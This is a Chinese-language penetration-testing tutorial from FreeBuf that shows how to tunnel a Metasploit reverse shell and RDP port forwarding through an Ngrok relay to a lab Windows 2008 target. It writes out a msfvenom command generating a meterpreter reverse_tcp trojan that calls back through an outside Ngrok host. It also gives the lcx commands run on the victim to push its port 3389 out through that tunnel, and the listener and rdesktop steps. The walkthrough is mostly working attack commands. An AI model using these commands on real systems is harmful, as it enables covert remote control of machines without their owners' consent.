**相信大家在渗透测试时如果遇到内网IP瞬间心情就不好了，因为自己是内网，目标也是内网，怎么勾搭上？而且像我这等穷人又没钱买死贵死贵的vps搭建云Kali，怎么办？这时候就要借助内网穿透工具了，网上很多工具都能实现，这里推荐[Ngrok](http://www.ngrok.cc/)。但是我既想通过[Ngrok](https://my.freebuf.com/post/edit/)在metaspolit下反弹shell，同时又想把对方的3389端口转发到本地，在meterperter下鱼和熊掌我都要！**

> Kali地址：192.168.61.130（攻击机地址）
>
> 靶机win2008: 192.168.61.134（模拟外网私人地址）
>
> 中间跳板ngrok ：vipgz4.idcfengye.com
>
> 工具：lcx windows版与linux版

## 一、反弹shell到本地

1.首先注册个ngrok并配置好需要转接的端口：8848（这里就不在赘述如何配置了，网上教程很多。）

![](https://image.3001.net/images/20200407/1586241490_5e8c1fd22393c.png!small)

2.在kali下构造生成反弹木马：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=vipgz4.idcfengye.com LPORT=10040 -f exe -a x86 --platform win -o gong32.exe
    
    Lhost：为Ngrok服务地址    
    Lport：为Ngrok分配的隧道端口

3.在Kali中运行Ngrok的客户端：  

    
    
    ./sunny clientid Ngrok的ID号

![](https://image.3001.net/images/20200407/1586242248_5e8c22c8ca1ea.png!small)

4.Kali攻击机配置监听：

此处的lhost与lport与Ngrok中的配置相同，并开始监听。

![](https://image.3001.net/images/20200407/1586242388_5e8c23541659d.png!small)

5.将生成的木马放到靶机运行：

![](https://image.3001.net/images/20200407/1586242603_5e8c242bc0162.png!small)

![](https://image.3001.net/images/20200407/1586242616_5e8c243875b76.png!small)

成功得到通过中转反弹过来的shell。

PS：接下就要将对方的端口转发到我们本地了，以3389端口远程桌面为例。由于是通过Ngrok中转反弹到的shell，所以portfwd命令不能将远程桌面直接在metaspolit框架中实现，这里借助lcx继续进行反弹。

## 二、转发3389端口到本地

1．在Kali中执行lcx监听和转发命令：

    
    
    ./portmap -m 2 -p1 8848 -p2 33891 

P1为本地监听的端口（与ngrok转发的端口一致）

P2为本地转发的端口（随便命名，但不能是已被占用的端口）

![](https://image.3001.net/images/20200407/1586243442_5e8c277252747.png!small)

![](https://image.3001.net/images/20200407/1586243450_5e8c277a9bce2.png!small)

2.到靶机中执行lcx端口转发，通过meterperter进入shell执行命令：

    
    
    lcx -slave vipgz4.idcfengye.com 10040 127.0.0.1 3389 

slave后跟Ngrok服务器地址与隧道端口+本地需要转发的端口

![](https://image.3001.net/images/20200407/1586243797_5e8c28d5dbce7.png!small)

看到ngrok客户端多出回弹的消息

![](https://image.3001.net/images/20200407/1586243870_5e8c291ebe176.png!small)

3.开始在Kali中连接远程桌面连接：

    
    
    rdesktop 127.0.0.1:33891

![](https://image.3001.net/images/20200407/1586243987_5e8c29931ba35.png!small)

![](https://image.3001.net/images/20200407/1586244026_5e8c29ba88819.png!small)

![](https://image.3001.net/images/20200407/1586244040_5e8c29c819745.png!small)

![](https://image.3001.net/images/20200407/1586244053_5e8c29d5bc105.png!small)

至此我们已经成功连接上了3389远程桌面。由于全程都在一台本地kali环境中操作，且只用了一条Ngrok隧道大大减少了成本。

 ***本文作者：waowao，转载请注明来自FreeBuf.COM**

